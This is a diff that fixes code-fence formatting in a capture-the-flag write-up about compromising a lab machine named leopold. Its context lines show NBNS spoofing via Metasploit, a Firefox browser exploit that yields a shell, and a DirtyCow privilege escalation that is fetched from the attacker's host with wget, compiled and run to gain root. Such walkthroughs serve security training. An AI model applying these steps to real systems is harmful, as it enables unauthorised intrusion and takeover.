@@ -28,7 +28,8 @@ PORT    STATE SERVICE     VERSION
 The smb service doesn't yield anything useful, other than that it's a Linux machine, due to the Samba implementation of SMB. Where do we go from here? Let's fire up Wireshark to see if we can learn anything from there.
 
 After some minutes we can see that there is a NBNS request for DISNEYWORLD made from leopold:
-```192.168.0.31 192.168.0.255 NBNS 92 Name query NB DISNEYWORLD<00>```
+```
+192.168.0.31 192.168.0.255 NBNS 92 Name query NB DISNEYWORLD<00>```
 
 ## Setting up Man-in-the-middle
 
@@ -65,7 +66,9 @@ msf5 auxiliary(spoof/nbns/nbns_response) > run
 msf5 auxiliary(spoof/nbns/nbns_response) > ```
 
 Soon we will see the following output in Metasploit, meaning that leopold now thinks that the DISNEYWORLD hostname is resolving to our attacking computer.
-```[+] 192.168.0.31     nbns - DISNEYWORLD matches regex, responding with 192.168.0.32```
+
+```
+[+] 192.168.0.31     nbns - DISNEYWORLD matches regex, responding with 192.168.0.32```
 
 We will also soon after see some TCP requests to port 80 from leopold to our attacking machine in Wireshark. However, we don't have anything running on port 80. We can fire up a netcat listener to see the request.
 
@@ -82,7 +85,8 @@ User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefo
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Connection: keep-alive```
+Connection: keep-alive
+```
 
 Here we have the request leopold is making. There is two key pieces of information we can gather from this, namely the user-agent string and the endpoint he is trying to reach, which is the root directory. After a quick web search on the user-agent string, we learn that leopold is using Firefox 16.
 
@@ -121,7 +125,8 @@ Exploit target:
    0   Universal (Javascript XPCOM Shell)
 
 
-msf5 exploit(multi/browser/firefox_tostring_console_injection) > ```
+msf5 exploit(multi/browser/firefox_tostring_console_injection) > 
+```
 
 After some minutes we get a shell:
 
@@ -134,7 +139,8 @@ msf5 exploit(multi/browser/firefox_tostring_console_injection) > sessions -i 1
 [*] Starting interaction with 1...
 
 id
-uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)```
+uid=1000(leopold) gid=1000(leopold) groups=1000(leopold),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
+```
 
 The shell is not stable and dies after some mintues. To fix this, we can create a new shell. Open a new netcat listener on port 3333 on the attacking machine and write the code below in the current shell. Remember to change the attacking IP address.
 
@@ -149,21 +155,24 @@ Due to the old Linux kernel version, we can try the goto DirtyCow exploit. Simpl
 ```bash
 root@kali:~# wget https://www.exploit-db.com/download/40839
 root@kali:~# mv 40839 40839.c
-root@kali:~# python3 -m http.server 8080```
+root@kali:~# python3 -m http.server 8080
+```
 
 Download, compile and run the exploit on the target host, from the remote leopold shell:
 
 ```bash
 $ wget http://192.168.0.32
 $ gcc 40839.c -o cow -pthread -lcrypt
-$ ./cow```
+$ ./cow
+```
 
 Enter a password for the firefart root user and wait for the exploit to finish, before switching to the firefart user:
 
 ```bash
 $ su firefart
 $ id
-$ uid=0(firefart) gid=0(root) groups=0(root)```
+$ uid=0(firefart) gid=0(root) groups=0(root)
+```
 
 ## Summary
 
